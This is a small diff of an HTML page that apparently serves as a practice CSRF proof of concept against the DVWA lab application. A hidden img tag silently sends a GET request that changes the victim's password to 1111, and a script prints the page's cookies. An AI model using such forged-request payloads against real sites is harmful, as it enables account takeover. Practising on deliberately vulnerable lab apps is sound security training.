@@ -2,11 +2,11 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>csrf by GET</title>
+  <title>csrf by img tag</title>
 </head>
 <body>
 set password to: 1111
-<img src="http://localhost:8086/vulnerabilities/csrf/?password_new=1111&password_conf=1111&Change=Change">
+<img src="http://dvwa.localtest/vulnerabilities/csrf/?password_new=1111&password_conf=1111&Change=Change">
 <script>
   console.log(`your cookie is: ${document.cookie}`)
 </script>
